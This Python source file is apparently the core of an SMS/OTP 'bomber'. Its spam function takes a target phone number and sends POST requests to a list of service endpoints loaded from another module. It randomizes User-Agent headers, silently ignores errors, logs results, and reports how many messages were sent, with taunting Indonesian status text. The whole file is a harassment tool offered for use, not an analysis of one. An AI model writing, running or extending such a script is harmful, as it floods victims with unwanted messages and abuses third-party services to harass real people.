import os, sys, time
from datetime import datetime
from config import _x
from junk import G, C, Y, R, P, W, N, _u

def spam(phone):
    print(f"\n  {C}[*] Target : {phone}{N}\n")
    el = _x(phone)
    dc = 0
    for name, url, h, b in el:
        h["User-Agent"] = _u()
        try:
            import requests as _rr
            rr = _rr.post(url, json=b, headers=h, timeout=15)
            if rr.status_code in (200, 201, 202): dc += 1
            with open(os.path.expanduser("~/umambo/log"), "a") as f:
                f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {name} {rr.status_code}\n")
        except: pass
        for ch in ["◧", "◨", "◩", "◪", "◫"]:
            sys.stdout.write(f"\r  {P}{ch}{N} Mengirim... ")
            sys.stdout.flush()
            time.sleep(0.6)
        time.sleep(3)
    sys.stdout.write("\r" + " " * 30 + "\r")
    print(f"  {G}✓ Dah tuh, puas?{N}")
    print(f"  {C}{dc}/{len(el)} terkirim{N}")
    input(f"\n  {W}[Enter] Kembali...{N}")
